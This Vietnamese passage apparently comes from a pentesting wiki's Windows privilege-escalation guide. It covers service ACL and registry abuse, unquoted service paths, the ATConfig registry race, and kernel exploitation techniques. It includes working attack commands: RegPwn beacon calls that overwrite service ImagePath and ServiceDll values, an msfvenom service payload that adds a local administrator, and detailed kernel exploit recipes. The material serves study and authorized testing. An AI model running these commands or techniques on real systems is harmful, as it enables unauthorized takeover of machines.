FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tìm các ACL nguy hiểm được cấp cho **`Everyone`**, **`BUILTIN\Users`** hoặc **`Authenticated Users`**, đặc biệt là **`(F)`**, **`(M)`** hoặc **`(W)`** trên tệp thực thi dịch vụ hoặc thư mục chứa tệp đó. Quy trình khai thác thực tế như sau:<sup>[[27]](#references)</sup>

1. Xác nhận tài khoản dịch vụ và đường dẫn tệp thực thi bằng `sc qc <service_name>`.
2. Xác nhận tệp binary có thể ghi được bằng `icacls <path>`.
3. Thay thế tệp binary của dịch vụ bằng payload hoặc một tệp binary dịch vụ độc hại hợp lệ.
4. Khởi động lại dịch vụ bằng `sc stop <service_name> && sc start <service_name>` (hoặc chờ khởi động lại / kích hoạt dịch vụ).

Các bước kiểm tra tự động hữu ích:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Nếu dịch vụ không cho phép người dùng thông thường khởi động lại, hãy kiểm tra xem dịch vụ có tự khởi động khi boot, có failure action để khởi chạy lại hay có thể được ứng dụng đang sử dụng dịch vụ kích hoạt gián tiếp hay không.

### Quyền sửa đổi registry của dịch vụ

Bạn nên kiểm tra xem mình có thể sửa đổi registry của dịch vụ nào không.\
Bạn có thể **kiểm tra** **quyền** của mình đối với **registry** dịch vụ bằng cách:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Bài kiểm tra quyền ban đầu được nêu như sau:

Cần kiểm tra xem **Authenticated Users** hoặc **NT AUTHORITY\INTERACTIVE** có quyền `FullControl` hay không. Nếu có, có thể sửa đổi binary được dịch vụ thực thi.

Kiểm tra xem **Authenticated Users** hoặc **NT AUTHORITY\INTERACTIVE** có quyền trên registry key của một dịch vụ cụ thể cho phép ghi hay không. Chỉ có một mục ACL thôi chưa chứng minh được quyền truy cập thực tế: các mục từ chối, token hiện tại và quyền kế thừa đều có ảnh hưởng. Quyền trên registry key khác với quyền `SERVICE_CHANGE_CONFIG` và `SERVICE_START` trên đối tượng dịch vụ. Để leo thang đặc quyền, còn cần một trường cấu hình dịch vụ có thể sử dụng, cách kích hoạt dịch vụ và một danh tính dịch vụ có đặc quyền cao hơn. Xem tài liệu của Microsoft về [quyền trên registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) và [tham chiếu về quyền truy cập dịch vụ](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Để thay đổi Path của binary được thực thi:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race symlink Registry để ghi giá trị HKLM bất kỳ (ATConfig)

Một số tính năng Trợ năng của Windows tạo các khóa **ATConfig** theo từng người dùng, sau đó một tiến trình **SYSTEM** sao chép chúng vào khóa phiên HKLM. Một **race symbolic link** trong Registry có thể chuyển hướng thao tác ghi đặc quyền này đến **bất kỳ đường dẫn HKLM nào**, tạo primitive **ghi giá trị HKLM** tùy ý.<sup>[[18]](#references)</sup>

Các vị trí khóa (ví dụ: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` liệt kê các tính năng trợ năng đã cài đặt.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` lưu cấu hình do người dùng kiểm soát.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` được tạo khi đăng nhập/chuyển sang secure desktop và người dùng có thể ghi vào.

Quy trình khai thác (CVE-2026-24291 / ATConfig):

1. Điền giá trị **HKCU ATConfig** mà bạn muốn SYSTEM ghi.
2. Kích hoạt thao tác sao chép secure desktop (ví dụ: **LockWorkstation**), thao tác này khởi chạy luồng AT broker.
3. **Thắng race** bằng cách đặt một **oplock** trên `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; khi oplock kích hoạt, thay khóa **HKLM Session ATConfig** bằng một **registry link** trỏ đến mục tiêu HKLM được bảo vệ.
4. SYSTEM ghi giá trị do kẻ tấn công chọn vào đường dẫn HKLM đã được chuyển hướng.

Khi đã có khả năng ghi giá trị HKLM tùy ý, hãy pivot sang LPE bằng cách ghi đè các giá trị cấu hình dịch vụ:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/dòng lệnh)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chọn một dịch vụ mà người dùng bình thường có thể khởi động (ví dụ: **`msiserver`**) rồi kích hoạt dịch vụ đó sau khi ghi giá trị. **Lưu ý:** cách triển khai exploit công khai **khóa workstation** trong quá trình race.

Công cụ ví dụ (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Quyền AppendData/AddSubdirectory trên Registry của Services

Nếu bạn có quyền này trên một registry, điều đó có nghĩa là **bạn có thể tạo registry con từ registry này**. Với Windows services, quyền này **đủ để thực thi mã tùy ý:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Nếu đường dẫn đến tệp thực thi không được đặt trong dấu ngoặc kép, Windows sẽ thử thực thi mọi phần kết thúc trước một dấu cách.

Ví dụ, với đường dẫn _C:\Program Files\Some Folder\Service.exe_, Windows sẽ thử thực thi:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liệt kê tất cả các đường dẫn dịch vụ không được đặt trong dấu ngoặc kép, ngoại trừ những đường dẫn thuộc các dịch vụ Windows tích hợp sẵn:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bạn có thể phát hiện và khai thác** lỗ hổng này bằng metasploit: `exploit/windows/local/trusted\_service\_path` Bạn có thể tạo thủ công một service binary bằng metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Hành động khôi phục

Windows cho phép người dùng chỉ định các hành động sẽ được thực hiện nếu một dịch vụ gặp lỗi. Có thể cấu hình tính năng này để trỏ đến một binary. Nếu có thể thay thế binary này, thì có thể leo thang đặc quyền. Xem thêm chi tiết trong [tài liệu chính thức](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Đích đến của script trong tác vụ đã lên lịch

Với một tác vụ được bật chạy `cmd.exe /c` cùng tệp `.bat` hoặc `.cmd`, hãy kiểm tra script được nêu trong **đối số hành động** cũng như `cmd.exe`. Điều tương tự áp dụng cho đối số tệp được chỉ định rõ ràng cho trình thông dịch, chẳng hạn như `-File` của PowerShell. Nếu một tệp batch đã lên lịch chứa lệnh gọi PowerShell `-File` trực tiếp, hãy kiểm tra cả ACL của script được tham chiếu; cần lần theo thủ công các biến, điều kiện và chuỗi lệnh trong shell. Một script hoặc thư mục cha mà người gọi có quyền ghi chỉ là đầu mối để thực thi chéo tài khoản khi principal của tác vụ được cấu hình khác với người gọi và tác vụ thực sự chạy đến hành động đó. ACL chỉ cho phép ghi nối thêm có thể ảnh hưởng đến script, nhưng lệnh `exit` trước đó hoặc luồng điều khiển khác có thể khiến các dòng được nối thêm không thể chạy tới. Hãy xác nhận ACL hiệu lực, [ngữ cảnh thực thi tác vụ](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), thư mục làm việc, trigger và chính sách kiểm soát ứng dụng trước khi kết luận có thể leo thang đặc quyền. Quá trình kiểm kê không được sửa đổi script hoặc khởi chạy tác vụ.

## Named stream trên các tệp có thể truy cập

Trên NTFS, một tệp có thể đọc được có thể chứa named `:$DATA` stream mà danh sách thư mục thông thường không hiển thị. Với một tập hợp nhỏ, phù hợp gồm các tệp sao lưu hoặc tệp cấu hình có thể truy cập, hãy xem lại **tên và kích thước** của stream trước khi mở nội dung; Windows cung cấp khả năng này qua [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) và PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Tên stream gợi ý có chứa secret chỉ là một đầu mối. Hãy kiểm tra quyền đọc hiệu lực của tệp, khả năng hỗ trợ stream của filesystem, liệu stream có chứa thông tin xác thực hữu dụng hay không và tài khoản mà thông tin đó thực sự xác thực. Tránh quét stream đệ quy và in nội dung stream trong quá trình kiểm kê thông thường.

## Tệp đầu vào cho helper của Windows Driver Kit được lên lịch

Windows Driver Kit tùy chọn bao gồm `StandaloneRunner.exe`, có thể sử dụng các tệp `command.txt`, `reboot.rsf` và tệp `working\rsf.rsf` của project từ thư mục chạy. Một tác vụ đã lên lịch hoặc dịch vụ khởi chạy helper này bằng tài khoản có đặc quyền có thể biến quyền ghi ở mức đặc quyền thấp vào các tệp đầu vào đó thành việc thực thi lệnh trong ngữ cảnh của tài khoản ấy, ngay cả khi bản thân tệp thực thi của helper được bảo vệ. Hãy xác nhận có tiến trình đặc quyền sử dụng các tệp này và **cả hai** tệp sidecar đều có thể được tạo hoặc sửa đổi; chỉ tìm thấy helper là chưa đủ.

Với tác vụ đã lên lịch, hãy kiểm tra [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) trong action của tác vụ và ACL của hai đường dẫn sidecar. Nếu tác vụ không chỉ định thư mục làm việc, thư mục của tệp thực thi chỉ là một đầu mối cần xác minh, không phải bằng chứng về nơi tác vụ đọc các tệp đầu vào. Điều kiện tiên quyết về tệp làm việc của project cũng phải được đáp ứng. Hãy kiểm tra principal thực tế của tác vụ thay vì giả định tác vụ chạy dưới quyền SYSTEM.

## Ứng dụng

### Ứng dụng đã cài đặt

Kiểm tra **quyền của các binary** (có thể bạn ghi đè được một binary để leo thang đặc quyền) và **các thư mục** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Đường dẫn sửa chữa Windows agent của Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) ảnh hưởng đến các Windows agent Checkmk đời cũ, vốn ghi file lệnh vào `C:\Windows\Temp` rồi thực thi một file đã tồn tại và được bảo vệ chống ghi khi thao tác thay thế thất bại. Nhà cung cấp đã khắc phục vấn đề này trong các phiên bản 2.1.0p40, 2.2.0p23, 2.3.0b1 và 2.4.0b1. Hãy kiểm tra đầy đủ cấp bản vá đã cài đặt và xem thao tác agent bị ảnh hưởng có thể chạy hay không; nhãn chỉ thể hiện nhánh như `2.1` không đủ để xác định có bị ảnh hưởng hay không. Việc enumeration có thể kiểm tra phiên bản, trạng thái service và quyền trên Temp mà không tạo file hoặc kích hoạt lệnh agent.

#### Rà soát service SAML của ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ảnh hưởng đến ADSelfService Plus bản dựng 6210 trở xuống; nhà cung cấp đã khắc phục trong bản dựng 6211. Lỗ hổng chỉ liên quan nếu SAML SSO **đang hoặc từng được** bật. Do đó, mục sản phẩm đã cài đặt hoặc đường dẫn service chỉ là manh mối, không phải kết luận về lỗ hổng: hãy xác nhận chính xác bản dựng, lịch sử cấu hình SAML, khả năng truy cập mạng của service và tài khoản mà service chạy dưới quyền. Việc thực thi code thông qua service sẽ kế thừa quyền của tài khoản đó; để chạy dưới quyền SYSTEM, instance phải chạy với tài khoản SYSTEM. Một file `OfflineBackup_*.ezip` có thể đọc được trong thư mục Backup của sản phẩm là một manh mối riêng về bản sao lưu được mã hóa, không phải bằng chứng về thông tin xác thực có thể sử dụng hoặc lỗ hổng SAML này. Trong quá trình enumeration thông thường, hãy ghi lại đường dẫn và quyền truy cập của file mà không giải nén.

#### Ranh giới quyền của Jenkins controller và tài khoản domain

Trên Windows Jenkins controller, hãy phân biệt quyền tạo hoặc cấu hình job với quyền khởi chạy job: [Jenkins mô tả đây là các quyền `Job/Create`, `Job/Configure` và `Job/Build` riêng biệt](https://www.jenkins.io/doc/book/security/access-control/permissions/). Lịch chạy đã cấu hình hoặc remote trigger có thể tạo thêm một cách chạy build, nhưng cần xác nhận tính năng đó được bật và build thực sự chạy. Quá trình thực thi sử dụng danh tính của controller hoặc agent được chọn; credential đã lưu chỉ có thể dùng được nếu job truy cập được phạm vi của credential đó. Riêng biệt, hãy kiểm tra quyền truy cập metadata trong `JENKINS_HOME`: Jenkins lưu credential và khóa mã hóa trong `credentials.xml`, `secrets/hudson.util.Secret` và `secrets/master.key` ([lưu trữ secret của Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Chỉ sự hiện diện của các file này không tiết lộ mật khẩu; hãy xác minh **quyền đọc các file cần thiết** và một đường dẫn sử dụng lại tài khoản riêng biệt, đồng thời không in secret ra đầu ra dùng chung. Nếu tài khoản đó có quyền ghi `scriptPath` trên đối tượng người dùng AD, hãy xác nhận đường dẫn script có thể ghi được và có một lần đăng nhập thực tế hoặc tiến trình tiêu thụ theo lịch chạy dưới quyền người dùng mục tiêu trước khi xem đây là khả năng thực thi xuyên người dùng. Muốn kiểm soát thêm các group thì cần xác minh riêng các quyền AD hiệu lực.

#### Danh tính của Azure Pipelines self-hosted agent

Với dự án Azure DevOps Server hoặc Azure Pipelines, hãy phân biệt quyền **tạo hoặc chỉnh sửa** pipeline với quyền **xếp hàng chạy** pipeline và sử dụng agent pool đã chọn; [Microsoft mô tả riêng quyền pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) và [quyền cấp phép pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Nếu tài khoản có quyền thấp hơn có thể gửi một bước script và chạy pipeline đó trên self-hosted Windows agent, bước này sẽ chạy dưới quyền [tài khoản hệ điều hành đã cấu hình cho agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Trước khi kết luận có chuyển quyền xuyên người dùng hoặc lên SYSTEM, hãy xác minh chính xác pipeline, các giới hạn về branch/resource, pool được cấp quyền, job có thể chạy và danh tính service của agent. Agent đã cài đặt, vai trò dự án hoặc quyền ghi repository chỉ là manh mối; hãy rà soát quyền và metadata service cục bộ mà không khởi chạy build trong quá trình enumeration thụ động.

#### Credential của Microsoft Entra Connect Sync

[Microsoft phân biệt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **tài khoản service ADSync**, dùng để chạy dịch vụ đồng bộ và truy cập SQL database, với **tài khoản connector AD DS**, có quyền thư mục tùy thuộc vào các tính năng đồng bộ đã cấu hình. Credential của connector được lưu mã hóa trong database đó, với key material được [DPAPI bảo vệ dưới tài khoản service ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Chỉ riêng việc có service đồng bộ đã cài đặt, một group có tên giống như quản trị viên cục bộ hoặc khả năng xem database không đủ để chứng minh credential có thể giải mã hoặc có thể leo thang lên domain. Hãy rà soát riêng quyền đọc database thực tế, quyền truy cập service account/key, bố cục cài đặt và SQL, danh tính connector đã cấu hình, cùng các quyền AD hiệu lực của danh tính đó. Enumeration thông thường chỉ nên hiển thị metadata về service và quyền truy cập, không truy vấn hoặc in ra secret đã lưu.

#### Quyền trên support DLL của printer driver

Printer driver đã cài đặt có thể lưu support DLL trong `C:\ProgramData` và nạp chúng trong một print process có nhiều quyền hơn. Hãy rà soát ACL của thư mục driver và DLL cụ thể, bao gồm các thư mục cha và reparse point, ngay cả khi không thể enumeration printer bằng WMI. Với [vấn đề printer driver Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), đường dẫn được báo cáo là `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [bài công bố ban đầu](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) mô tả việc `PrintIsolationHost.exe` nạp DLL. ACL cho phép ghi chỉ là manh mối: hãy xác minh quyền ghi hiệu lực sau khi xét các mục từ chối, driver liên quan đã được cài đặt và có nạp file dưới một danh tính có đặc quyền hay không, cũng như driver đã cập nhật hoặc chương trình bảo mật của nhà cung cấp có khắc phục lỗi trong bản cài đặt hay chưa. Không suy luận có lỗ hổng chỉ dựa trên tên thư mục hoặc phiên bản driver.

### Quyền ghi

Kiểm tra xem bạn có thể sửa đổi một file cấu hình nào đó để đọc file đặc biệt, hoặc sửa đổi binary sẽ được thực thi bởi tài khoản Administrator (schedtasks) hay không.

Có thể tìm các quyền yếu trên thư mục/file trong hệ thống bằng cách chạy:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ tự động tải mọi plugin DLL trong các thư mục con `plugins`. Nếu có bản cài portable/bản sao có thể ghi được, việc thả một plugin độc hại vào đó sẽ tự động thực thi code bên trong `notepad++.exe` mỗi khi khởi chạy (bao gồm từ `DllMain` và các plugin callback).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Chạy khi khởi động

**Kiểm tra xem bạn có thể ghi đè registry hoặc binary nào sẽ được người dùng khác thực thi hay không.**\
**Đọc** **trang sau** để tìm hiểu thêm về các **vị trí autoruns đáng chú ý để leo thang đặc quyền**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tìm các driver **bên thứ ba bất thường/dễ bị khai thác** có thể có.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Nếu driver cung cấp primitive đọc/ghi kernel tùy ý (thường gặp trong các trình xử lý IOCTL được thiết kế kém), bạn có thể leo thang bằng cách đánh cắp trực tiếp token SYSTEM từ bộ nhớ kernel.<sup>[[13]](#references)</sup> Xem kỹ thuật từng bước tại đây:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Tài liệu liên quan về khai thác kernel Windows:

Đối với trường hợp ring-buffer ở kernel mode có các thanh ghi đọc/ghi mà user có thể ghi, hãy xem biến thể [USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Đối với các lỗi race condition mà lời gọi dễ bị tấn công mở một đường dẫn Object Manager do attacker kiểm soát, việc cố ý làm chậm quá trình tra cứu (bằng các thành phần có độ dài tối đa hoặc chuỗi thư mục sâu) có thể kéo dài khoảng thời gian từ microsecond lên hàng chục microsecond:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF trong cancel-safe queue, lộ dữ liệu paged-pool và pivot I/O ring

Một số chuỗi LPE trong kernel Windows có thể được xây dựng từ hai lỗi riêng lẻ vốn yếu: một **race về vòng đời của cancel-safe queue** làm giải phóng request/CBD khi queue lock vẫn đang được giữ, và một lỗi lộ dữ liệu **nhả lock trước khi copy** làm rò rỉ allocation paged-pool đã được giải phóng trong `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Ghi chú về audit và khai thác:

- **Giải phóng khi đang giữ lock + cancel sau đó**: tìm đường xử lý thành công có dạng **Acquire -> CompleteRequest/free -> Release**, trong khi đường cancel có dạng **Acquire -> RemoveIo(con trỏ cũ) -> Release -> CompleteCanceledIo**. Nếu đường xử lý thành công đi tới `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` trước khi nhả lock CBDQ/CSQ, một thread bị chặn trong `NtCancelIoFileEx -> IopCsqCancelRoutine` có thể tiếp tục chạy sau đó và truyền một `PFLT_CALLBACK_DATA` đã được giải phóng vào callback remove của driver.
- **Chiếm lại queue object đã được giải phóng** bằng một allocation paged-pool cùng kích thước do attacker kiểm soát. `NPFS` Data Queue Entries hữu ích vì payload và kích thước có thể kiểm soát, sau đó có thể thăm dò chúng bằng các thao tác đọc/peek pipe. Nếu object đã giải phóng chứa các list link, hãy ghi đè chúng bằng một **danh sách vòng lặp các node request giả trong user memory** để driver liên tục xử lý các cấu trúc request do attacker định nghĩa thay vì dừng ở list head ban đầu.
- **Nâng cấp một lần ghi có thể dự đoán**: nếu request giả chuyển hướng một con trỏ context lồng nhau được dùng cho các lần ghi bookkeeping (timestamp / QPC / trường gần refcount), bạn có thể có được một lần ghi kernel **kiểm soát được địa chỉ nhưng không kiểm soát được giá trị**. Trong trường hợp đó, hãy nhắm vào trường **length/size** của một pool object được spray thay vì con trỏ code/data cuối cùng, rồi duyệt qua các object được spray cho đến khi object bị hỏng tạo ra **lần đọc paged-pool vượt phạm vi**.
- **Mẫu lộ dữ liệu có thể race**: bất kỳ syscall nào có dạng `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` đều là ứng viên tiềm năng. Độ tin cậy tăng lên khi attacker có thể làm buffer được copy lớn hơn (ví dụ bằng cách thêm nhiều list/resource entry làm tăng kích thước allocation cuối cùng của serializer), vì copy lâu hơn sẽ mở rộng khoảng thời gian thay thế mà không nhất thiết làm crash máy.
- **Đích refill có nhiều con trỏ**: các mảng registered-buffer của Windows **I/O ring** là đích lộ dữ liệu rất tốt vì kích thước paged-pool của chúng do attacker kiểm soát (`8 * regBufferCnt`) và mỗi phần tử là một con trỏ kernel tới `_IOP_MC_BUFFER_ENTRY`. Hãy leak một trong các mảng này, khôi phục `IORING_OBJECT` bao quanh, rồi làm hỏng **`RegBuffers`** và **`RegBuffersCount`** để các thao tác I/O ring tiếp theo sử dụng các entry do attacker giả mạo và cung cấp khả năng đọc/ghi kernel tùy ý. Nếu cách ghi duy nhất hiện có tạo ra một byte ổn định (ví dụ từ `KUSER_SHARED_DATA+0x14`), hãy dùng **các lần ghi không căn chỉnh chồng lấn** để tạo con trỏ user lặp byte như `0x0101010101010101`, ánh xạ nó bằng `VirtualAlloc`, rồi đặt mảng registered-buffer giả mạo tại đó.<sup>[[30]](#references)</sup>

Các dấu hiệu hữu ích khi debug:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sau khi lấy được arbitrary kernel read/write từ I/O ring bị lỗi, hãy đánh cắp SYSTEM token theo quy trình hậu khai thác tiêu chuẩn:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Các primitive memory corruption trong Registry hive

Các lỗ hổng hive hiện đại cho phép bạn sắp xếp bố cục bộ nhớ một cách xác định, khai thác các hậu duệ HKLM/HKU có thể ghi và biến lỗi hỏng metadata thành lỗi tràn kernel paged-pool mà không cần driver tùy chỉnh. Tìm hiểu toàn bộ chuỗi tại đây:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ở direct mode của `RtlQueryRegistryValues` từ các path do attacker kiểm soát

Một số driver nhận path Registry từ userland, chỉ xác thực rằng đó là chuỗi UTF-16 hợp lệ, rồi gọi `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` với `RTL_QUERY_REGISTRY_DIRECT` trỏ vào một biến scalar trên stack, chẳng hạn `int readValue`. Nếu thiếu `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` sẽ được diễn giải theo kiểu Registry **thực tế**, chứ không phải kiểu mà developer mong đợi.

Điều này tạo ra hai primitive hữu ích:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path tuyệt đối `\Registry\...` do người dùng kiểm soát cho phép driver truy vấn các key do attacker chọn, làm lộ sự tồn tại thông qua mã trả về/log và đôi khi đọc được các value mà caller không thể truy cập trực tiếp.
- **Kernel memory corruption**: đích scalar như `&readValue` bị type confusion thành `REG_QWORD`, `UNICODE_STRING` hoặc buffer nhị phân có kích thước tùy theo kiểu Registry của value.

Ghi chú khai thác thực tế:

- **Biện pháp giảm thiểu trên Windows 8 trở lên**: nếu truy vấn chạm tới một **untrusted hive** bằng `RTL_QUERY_REGISTRY_DIRECT` nhưng không có `RTL_QUERY_REGISTRY_TYPECHECK`, các caller trong kernel sẽ crash với `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Để duy trì khả năng khai thác, hãy tìm các key **có thể ghi bởi attacker bên trong trusted system hive** thay vì staging value dưới `HKCU`.
- **Staging trong trusted hive**: dùng NtObjectManager để liệt kê các hậu duệ có thể ghi của `\Registry\Machine`, rồi chạy lại quá trình quét bằng token **low-integrity** đã được nhân bản để tìm các key có thể truy cập từ những ngữ cảnh sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: ghi trực tiếp 8 byte vào `int` 4 byte sẽ làm hỏng dữ liệu stack liền kề và có thể ghi đè một phần callback/function pointer ở gần đó.
- **`REG_SZ` / `REG_EXPAND_SZ`**: chế độ direct yêu cầu `EntryContext` trỏ đến một `UNICODE_STRING`. Nếu code trước tiên tải `REG_DWORD` do attacker kiểm soát vào một scalar trên stack rồi dùng lại cùng buffer đó để đọc string, attacker kiểm soát `Length`/`MaximumLength` và ảnh hưởng một phần đến con trỏ `Buffer`, tạo ra một kernel write được kiểm soát một phần.
- **`REG_BINARY`**: với dữ liệu binary lớn, chế độ direct coi `LONG` đầu tiên tại `EntryContext` là kích thước buffer có dấu. Nếu lần đọc `REG_DWORD` trước đó để lại một giá trị **âm** do attacker kiểm soát trong scalar được dùng lại, truy vấn `REG_BINARY` tiếp theo sẽ sao chép byte do attacker cung cấp trực tiếp lên các slot stack liền kề, đây thường là cách dễ nhất để ghi đè hoàn toàn callback pointer.

Pattern hunting đáng chú ý: **các lần đọc registry không đồng nhất vào cùng một biến stack mà không khởi tạo lại biến đó**. Grep `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, các con trỏ `EntryContext` được dùng lại và các nhánh code trong đó lần đọc registry đầu tiên quyết định có thực hiện lần đọc thứ hai hay không.

#### Lạm dụng việc thiếu FILE_DEVICE_SECURE_OPEN trên device object (LPE + EDR kill)

